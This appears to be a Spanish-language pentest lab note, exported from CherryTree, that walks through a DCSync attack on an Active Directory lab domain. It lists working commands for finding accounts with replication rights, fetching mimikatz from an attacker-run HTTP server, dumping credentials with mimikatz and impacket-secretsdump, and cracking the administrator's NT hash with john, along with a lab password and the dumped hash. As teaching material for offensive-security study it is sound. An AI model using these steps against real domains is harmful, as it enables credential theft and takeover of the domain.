<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>DCSync</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>DCSync</h1><br/><p><em><strong><h1>DSYNC</h1></strong></em></p><p></p><p><h3>Dentro de un dominio puede haber varios controladores de dominio y es lo recomendado para poder acceder a la información y no resida solo en un sistema por seguridad anti perdida o servicio.</h3></p><p></p><p>Si se desean mantener varios sistemas con una base de datos sincronizada windows proporciona un protocolo a través del cual un controlador o usuario puede hacer peticiones a otro controlador para obtener la información y actualizar su base de datos.</p><p></p><p>Este ataque aprovecha esto para hacer peticiones como si fuesemos otro controlador de dominio y así que el controlador de dominio original nos mande información sobre los usuario y datos de la base de datos.</p><p></p><p>Para esto en BloodHound tenemos :</p><p></p><p><img src="images/24-1.png" alt="images/24-1.png" /></p><p></p><p><img src="images/24-2.png" alt="images/24-2.png" /></p><p></p><p>Como vemos hay varios grupos que tienen estos privilegios debido a que por defecto hay algunos grupos que traen esta configuración por defecto.</p><p></p><p>Mediante PowerView:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#edd400;font-weight:400">Get-ObjectAcl</span> <span style="color:#000000;font-weight:700">-</span>ResolveGUIDs | <span style="color:#000000;font-weight:700">?</span> {<span style="color:#888a85;font-weight:700">$_</span>.ObjectAceType <span style="color:#000000;font-weight:700">-match</span> <span style="color:#edd400;font-weight:400">&quot;DS-Replication-Get-Changes&quot;</span>} | <span style="color:#729fcf;font-weight:400">select</span> ObjectDN,ObjectAceType,@{name<span style="color:#000000;font-weight:700">=</span><span style="color:#edd400;font-weight:400">&quot;name&quot;</span>;expression<span style="color:#000000;font-weight:700">=</span>{<span style="color:#edd400;font-weight:400">Convert-SidToName</span> <span style="color:#888a85;font-weight:700">$_</span>.SecurityIdentifier}}</pre></div></p><p></p><p><img src="images/24-3.png" alt="images/24-3.png" /></p><p></p><p>Vamos a usar a el usuario brooks.aileen ya que pertenece a ITadmins y de ahí hereda el permiso de DCSYNc</p><p>Para poder replicar los datos:</p><p></p><p>Una herramienta muy popular pero a la vez posiblemente detectada por los sistemas de seguridad es mimikatz.</p><p></p><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p></p><p>Descargamos la release en kali y ahora la pasamos al equipo WS01.</p><p></p><p><div class="codebox"><pre><br />python2 -m SimpleHTTPServer</pre></div></p><p></p><p><div class="codebox"><pre><br />(<span style="color:#729fcf;font-weight:400">New-Object</span> System.NET.WebClient).DownloadFile(<span style="color:#edd400;font-weight:400">&quot;http://192.168.20.128:8000/mimikatz.exe&quot;</span>, <span style="color:#edd400;font-weight:400">&quot;gato.exe&quot;</span>) </pre></div></p><p></p><p>Esto obviamente será detectado por windows defender, más adelante se aplicarán técnicas para evadir la seguridad,</p><p></p><p>Para este ejemplo vamos a desactivar el antivirus de forma temporal.</p><p></p><p>Necesitamos el acceso brooks.aileen para poder recabar la información pero esta vez necesitamos que los privilegios sean remotos y locales por lo que una cosa que debemos hacer es llevar el archivo hasta un lugar donde brooks.aileen pueda ejecutarlo.</p><p></p><p><div class="codebox"><pre><br />runas <span style="color:#000000;font-weight:700">/</span>user<span style="color:#000000;font-weight:700">:</span>corp<span style="color:#000000;font-weight:700">\</span>brooks.aileen powershell</pre></div></p><p></p><p>Ejecutamos <strong>Mimikatz.exe</strong></p><p></p><p><div class="codebox"><pre><br />.<span style="color:#000000;font-weight:700">\</span>gato.exe</pre></div></p><p></p><p><div class="codebox"><pre><br />lsadump<span style="color:#000000;font-weight:700">::</span>dcsync <span style="color:#000000;font-weight:700">/</span>user<span style="color:#000000;font-weight:700">:</span>corp<span style="color:#000000;font-weight:700">\</span>administrador </pre></div></p><p></p><p>Donde el apartado administrador será el nombre del usuario que queramos dumpear.</p><p></p><p><img src="images/24-4.png" alt="images/24-4.png" /></p><p></p><p></p><p>Todo esto se puede ejecutar de forma remota desde Kali con las herramientas de Impacket:</p><p></p><p><div class="codebox"><pre><br />impacket-secretsdump -just-dc brooks.aileen<span style="color:#000000;font-weight:700">:</span><span style="color:#edd400;font-weight:400">&quot;Aileen&quot;</span>@192.168.20.5</pre></div></p><p></p><p>Obtenemos todos los hashes de todos los usuarios de la base de datos del dominio.</p><p></p><p>Incluido el del administrador:</p><p></p><p><strong><h2>Administrador:500:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::</h2></strong></p><p></p><p>Lo guardamos en un hash</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">echo</span> Administrador<span style="color:#000000;font-weight:700">:</span>500<span style="color:#000000;font-weight:700">:</span>aad3b435b51404eeaad3b435b51404ee<span style="color:#000000;font-weight:700">:</span>a87f3a337d73085c45f9416be5787d86<span style="color:#000000;font-weight:700">:::</span> &gt; admin.hash<br /></pre></div></p><p></p><p>Y lo podemos crackear.</p><p></p><p><div class="codebox"><pre><br />john --format=NT admin.hash</pre></div></p><p></p><p><img src="images/24-5.png" alt="images/24-5.png" /></p><p></p><p></p><p></p></div>
</body>
</html>
